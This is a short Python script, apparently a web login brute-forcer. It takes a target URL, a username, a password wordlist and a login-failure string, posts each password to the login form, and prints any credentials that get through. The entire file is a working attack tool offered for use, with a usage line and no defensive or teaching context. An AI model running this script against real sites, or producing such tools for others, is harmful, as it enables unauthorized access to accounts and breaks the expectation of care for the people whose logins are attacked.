import requests
import sys
import os

def cracking(username, url, passwdfile, login_failed_string):
    try:
        # Open the password file
        with open(passwdfile, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                print('Trying: ' + password)
                data = {'username': username, 'password': password, 'Login': 'submit'}
                response = requests.post(url, data=data)


                # Decode response and check for login failure string
                if login_failed_string in response.content.decode():
                    pass
                else:
                    print('Found username ' + '==>' + username)
                    print('Found password ' + '==>' + password)
                    exit(0)
            print('No match found.')
    except FileNotFoundError:
        print(f"Error: Password file '{passwdfile}' not found. Please provide a valid file path.")
        sys.exit(1)
    except requests.RequestException as e:
        print(f"Error: Unable to make a request to the URL. Details: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)

def main():
    # Ensure the correct number of arguments
    if len(sys.argv) != 5:
        print("Usage: python script.py <URL> <USERNAME> <PASSWORD_FILE> \"<LOGIN_FAILED_STRING>\"")
        sys.exit(1)

    # Parse command-line arguments
    url = sys.argv[1]
    username = sys.argv[2]
    passwdfile = sys.argv[3]
    login_failed_string = sys.argv[4]

    # Validate URL
    if not url.startswith(('http://', 'https://')):
        print("Error: Invalid URL. Ensure the URL starts with 'http://' or 'https://'.")
        sys.exit(1)

    # Validate password file
    if not os.path.isfile(passwdfile):
        print(f"Error: Password file '{passwdfile}' does not exist or is not a file.")
        sys.exit(1)

    # Start cracking
    cracking(username, url, passwdfile, login_failed_string)

if __name__ == "__main__":
    main()
